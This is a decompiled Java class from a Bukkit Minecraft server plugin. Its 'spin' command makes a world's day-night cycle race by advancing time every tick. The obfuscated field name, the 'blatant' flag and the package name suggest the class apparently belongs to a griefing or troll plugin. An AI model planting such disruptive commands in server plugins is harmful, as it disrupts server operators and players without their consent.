/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.World
 *  org.bukkit.entity.Player
 *  org.bukkit.plugin.Plugin
 */
package me.qlutch.sucks.command.impl;

import me.qlutch.sucks.Core;
import me.qlutch.sucks.command.Command;
import me.qlutch.sucks.utils.Settings;
import java.util.ArrayList;
import org.bukkit.Bukkit;
import org.bukkit.World;
import org.bukkit.entity.Player;
import org.bukkit.plugin.Plugin;

public class SpinCommand
extends Command {
    private final ArrayList<World> m7Xc2rTTyHdEsChfmjEDKe4B = new ArrayList();

    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        if (this.m7Xc2rTTyHdEsChfmjEDKe4B.contains(p2.getWorld())) {
            this.m7Xc2rTTyHdEsChfmjEDKe4B.remove(p2.getWorld());
            p2.sendMessage(Settings.PREFIX("The world has stopped spinning!"));
        } else {
            this.m7Xc2rTTyHdEsChfmjEDKe4B.add(p2.getWorld());
            p2.sendMessage(Settings.PREFIX("The world is now spinning!"));
            Bukkit.getServer().getScheduler().scheduleSyncRepeatingTask((Plugin)plugin, () -> {
                for (World world : this.m7Xc2rTTyHdEsChfmjEDKe4B) {
                    world.setTime(world.getTime() + 100L);
                }
            }, 1L, 1L);
        }
    }

    @Override
    public boolean isBlatant() {
        return true;
    }
}

